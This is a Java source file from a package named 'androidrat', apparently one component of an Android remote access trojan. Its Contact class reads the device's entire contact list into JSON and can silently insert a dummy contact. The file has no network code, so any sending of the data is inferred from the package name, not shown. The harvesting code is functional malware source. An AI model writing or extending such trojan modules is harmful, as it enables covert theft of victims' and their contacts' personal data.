package com.ot.androidrat;

import android.content.ContentProviderOperation;
import android.content.Context;
import android.content.OperationApplicationException;
import android.database.Cursor;
import android.os.RemoteException;
import android.provider.ContactsContract;
import android.view.View;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;

public class Contact {

    private Context context;

    public Contact (Context context) {
        this.context = context;
    }

    public void writeContact(){
        ArrayList contentProviderOperations = new ArrayList();
        //insert raw contact using RawContacts.CONTENT_URI
        contentProviderOperations.add(ContentProviderOperation.newInsert(ContactsContract.RawContacts.CONTENT_URI)
                .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null).withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null).build());
        //insert contact display name using Data.CONTENT_URI
        contentProviderOperations.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0).withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, "Contact from app").build());
        //insert mobile number using Data.CONTENT_URI
        contentProviderOperations.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0).withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, "012345678").withValue(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE).build());
        try {
            context.getContentResolver().applyBatch(ContactsContract.AUTHORITY, contentProviderOperations);
        } catch (RemoteException | OperationApplicationException e) {
            e.printStackTrace();
        }
    }

    public JSONObject readContacts(){
        try {
            JSONObject contacts = new JSONObject();
            JSONArray list = new JSONArray();
            Cursor cur = this.context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[] { ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null,  ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");


            while (cur.moveToNext()) {
                JSONObject contact = new JSONObject();
                String name = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));// for  number
                String num = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));// for name

                contact.put("phoneNo", num);
                contact.put("name", name);
                list.put(contact);

            }
            contacts.put("contactsList", list);
            return contacts;
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return null;

    }


}
